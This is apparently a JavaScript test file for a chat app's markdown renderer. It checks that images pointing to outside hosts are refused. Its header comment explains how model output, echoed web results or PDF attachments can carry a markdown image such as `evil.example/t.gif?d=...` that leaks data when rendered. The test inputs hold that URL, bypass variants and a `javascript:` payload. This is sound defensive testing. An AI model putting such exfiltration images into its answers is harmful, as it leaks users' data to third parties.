// A CHAT ANSWER CANNOT LOAD AN IMAGE FROM ANYWHERE IT WANTS (ΑΣ2-3.1,
// docs/SECURITY-REPORT.md, 2026-10-31).
//
// Nothing upstream of src/components/chat/message-content.tsx sanitises
// a markdown image: not the chat system prompt (it never mentions
// images), not web-sources.ts (it only escapes the citation URLs it
// itself builds), not answer-chart.ts (unrelated carrier). A model's own
// words, an echoed web-search result, or a wrapped-but-still-readable
// PDF attachment can contain `![x](https://evil.example/t.gif?d=...)`,
// and react-markdown with no `img` override renders that `src` as a
// real `<img>` with no filter at all — the request itself is the
// exfiltration channel, no click needed.
//
// Two independent stops, belt-and-braces like this repo's own
// frame-ancestors + X-Frame-Options:
//
//   (a) the app's CSP img-src (next.config.mjs, APP_SECURITY_HEADERS) —
//       held by scripts/tests/entitlement-trust.test.mjs §7, not
//       repeated here.
//   (b) message-content.tsx's own `img` component, which never emits an
//       `<img>` for a src outside the same allowlist — held here, since
//       the component carries react/react-markdown as real npm
//       dependencies this gate's loader (load-ts.mjs) cannot resolve
//       without writing to node_modules (which *.test.mjs may never do —
//       scripts/tests/billing-coverage.test.mjs §10). The function is
//       lifted out of the shipped file and run standalone, same
//       technique as scripts/tests/locale-resolution.test.mjs uses for
//       localeFromAcceptLanguage.
//
// Run: node scripts/tests/message-content.test.mjs
import { readFileSync } from "node:fs";
import { stripComments } from "../check-mutation-markers.mjs";

let pass = 0;
const failures = [];
const check = (name, cond, detail) => {
  if (cond) {
    pass++;
    console.log(`  PASS  ${name}`);
  } else {
    failures.push(name);
    console.log(`  FAIL  ${name}${detail !== undefined ? "\n        " + detail : ""}`);
  }
};

const source = readFileSync("src/components/chat/message-content.tsx", "utf8");
const code = stripComments(source);

console.log("== 1. isAllowedChatImageSrc, lifted and run standalone ==");
const fnStart = source.indexOf("export function isAllowedChatImageSrc");
check("isAllowedChatImageSrc is exported from message-content.tsx", fnStart !== -1);

let isAllowedChatImageSrc;
if (fnStart !== -1) {
  const body = source.slice(fnStart).replace(/^export /, "");
  const end = body.indexOf("\n}\n");
  const src = body
    .slice(0, end + 2)
    .replace(/: unknown/g, "")
    .replace(/: boolean/g, "");
  isAllowedChatImageSrc = new Function(`${src}; return isAllowedChatImageSrc;`)();
}

if (isAllowedChatImageSrc) {
  check("a same-origin relative path is allowed", isAllowedChatImageSrc("/api/images/x.png"));
  check("an inline data: URI is allowed", isAllowedChatImageSrc("data:image/png;base64,iVBORw0KGgo="));
  check("a chat attachment's local blob preview is allowed", isAllowedChatImageSrc("blob:http://localhost/abc-123"));
  check("https to an arbitrary host is refused — the exfiltration channel itself", !isAllowedChatImageSrc("https://evil.example/t.gif?d=leaked"));
  check("a protocol-relative URL is refused", !isAllowedChatImageSrc("//evil.example/t.gif"));
  check("...and so is the same address written with a backslash (hardening, 2026-11-05)", !isAllowedChatImageSrc("/\\evil.example/t.gif"));
  check("javascript: is refused", !isAllowedChatImageSrc("javascript:alert(1)"));
  check("nothing (no src at all) is refused, not treated as allowed", !isAllowedChatImageSrc(undefined) && !isAllowedChatImageSrc(""));
}

console.log("\n== 2. the markdown component is wired to it ==");
check("the img component calls the guard and renders nothing when it refuses",
  /img: \(\{ src, alt \}\) => \(isAllowedChatImageSrc\(src\)[\s\S]{0,120}: null\)/.test(code));
check("...and renders a real <img> only when it allows", /<img src=\{src as string\} alt=\{alt \?\? ""\}/.test(code));
check("no second, looser path ever renders an <img> without going through the guard",
  code.split("<img").length - 1 === 1);

console.log(failures.length ? `\nFAILURES: ${pass} passed, ${failures.length} failed` : `\nALL PASS: ${pass} passed, 0 failed`);
process.exitCode = failures.length === 0 ? 0 : 1;
